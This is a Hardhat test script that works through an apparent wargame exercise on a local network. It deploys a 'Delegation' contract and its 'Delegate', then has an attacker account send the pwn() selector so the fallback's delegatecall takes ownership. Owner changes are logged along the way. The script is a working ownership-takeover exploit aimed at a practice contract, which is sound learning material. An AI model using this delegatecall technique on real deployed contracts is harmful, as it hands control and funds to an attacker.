const { expect } = require("chai");
const { ethers } = require("hardhat");
const { Contract } = require("hardhat/internal/hardhat-network/stack-traces/model");

describe("Delegation Attacking script", function () {
  it("Deployment should work, n'est pas?", async function () {

    var assert = require('assert');

    const sixty_four_zeroes = "0000000000000000000000000000000000000000000000000000000000000000";
    const [deployer,attacker] = await ethers.getSigners();
    console.log(`Deployer/Owner address : ${deployer.address}`);
    console.log(`Attacker address ${attacker.address}`);
    console.log('');
    const DelegateContractFactory = await ethers.getContractFactory('contracts/5_Delegation.sol:Delegate');
    const delegatecontract = await DelegateContractFactory.deploy(deployer.address);//overrides); //"meep",{value: { BigNumber: "1" }});
    await delegatecontract.deployed();
    console.log('Delegate contract deployed to:', delegatecontract.address);
    const DelegationContractFactory = await ethers.getContractFactory('contracts/5_Delegation.sol:Delegation');
    const delegationcontract = await DelegationContractFactory.deploy(delegatecontract.address);//overrides); //"meep",{value: { BigNumber: "1" }});
    await delegationcontract.deployed();
    console.log('Delegation contract deployed to:', delegationcontract.address);

    // two contracts are deployed... let's rock and roll!
    console.log('Owner of Delegate contract   :', await delegatecontract.owner());
    console.log('Owner of Delegation contract :', await delegationcontract.owner());
    
    //var misc = bytes4(sha3("pwn()"));
    var misc2 = ethers.utils.id("pwn()").substring(0,10);// + sixty_four_zeroes;//ethers.utils.keccak256("pwn()").toString();
    console.log(misc2);

    //const overrides = { data: misc2 } ; // , value: ethers.utils.parseUnits("1", "wei")
      //const blah = await delegationcontract.noexist(overrides); //"meep",{value: { BigNumber: "1" }});


//var resulllttt = delegationcontract.connect(attacker);
//resulllttt.populateTransaction(//).sendTransaction(
    // not working
    const tx1 = await attacker.sendTransaction(
        {from: attacker.address, 
        to: delegationcontract.address,
//        gasLimit: "0x01bad458",
        data: misc2 });  //misc2 is "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"
        
    const str = JSON.stringify(tx1);
    console.log(str);
var tcount = await attacker.getTransactionCount();
console.log("Transaction count: " + tcount.toString());

var receipt = await ethers.provider.getTransactionReceipt(tx1.hash);
var receipt_str = JSON.stringify(receipt);
console.log("Transaction receipt: " + receipt_str);


console.log('Owner of Delegate contract   :', await delegatecontract.owner());
console.log('Owner of Delegation contract :', await delegationcontract.owner());

const tx2 = await attacker.sendTransaction(
    {from: attacker.address, 
    to: delegationcontract.address,
    gasLimit: "0x01bad458",
    data: misc2 });  //misc2 is "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"
    
const str2 = JSON.stringify(tx2);
console.log(str2);
var tcount2 = await attacker.getTransactionCount();
console.log("Transaction count: " + tcount2.toString());

var receipt2 = await ethers.provider.getTransactionReceipt(tx2.hash);
var receipt_str2 = JSON.stringify(receipt2);
console.log("Transaction receipt: " + receipt_str2);


console.log('Owner of Delegate contract   :', await delegatecontract.owner());
console.log('Owner of Delegation contract :', await delegationcontract.owner());

    //working
    const special_call = new ethers.Contract(
        delegationcontract.address,
        delegatecontract.interface,
        attacker
      );
    var tx3 = await special_call.connect(attacker).pwn();
    const str3 = JSON.stringify(tx3);
    console.log(str3);



    //await attacker.sendTransaction({
    //    from: "0x1733d5adaccbe8057dba822ea74806361d181654",
    //    to: delegationcontract.fallback.address, //"0xe3895c413b0035512c029878d1ce4d8702d02320",
    //    data: misc2 //"0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"
    //  });


      console.log('Owner of Delegate contract   :', await delegatecontract.owner());
      console.log('Owner of Delegation contract :', await delegationcontract.owner());
  
    expect('0').to.equal('0');

    });
});    